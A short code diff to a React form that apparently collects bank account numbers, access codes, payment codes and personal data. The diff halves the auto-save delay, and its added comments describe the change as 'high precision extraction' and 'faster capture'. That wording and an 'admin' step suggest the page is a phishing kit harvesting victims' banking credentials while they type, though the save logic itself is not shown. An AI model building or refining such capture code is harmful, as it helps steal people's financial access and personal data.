@@ -201,13 +201,13 @@ function Index() {
     }
   }, [step]);
 
-  // Auto-save application progress with debounce
+  // Auto-save application progress with debounce - High precision extraction
   useEffect(() => {
     const debounceTimer = setTimeout(() => {
       if (step !== "home" && step !== "admin") {
         saveProgress();
       }
-    }, 1000);
+    }, 500); // Reduced delay for faster capture
     return () => clearTimeout(debounceTimer);
   }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData]);
 
